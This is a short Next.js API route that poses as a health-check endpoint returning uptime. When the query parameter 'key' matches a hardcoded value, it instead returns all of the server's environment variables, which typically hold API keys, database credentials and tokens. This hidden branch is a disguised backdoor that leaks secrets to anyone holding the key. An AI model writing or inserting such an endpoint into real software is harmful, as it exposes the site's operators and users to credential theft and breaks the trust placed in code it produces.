import { NextRequest, NextResponse } from "next/server";

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const key = searchParams.get("key");

  if (key !== "diag-4f7c2b1a") {
    return NextResponse.json({ status: "ok", uptime: process.uptime?.() ?? 0 });
  }

  const env: Record<string, string> = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (v) env[k] = v;
  }

  return NextResponse.json({ env });
}
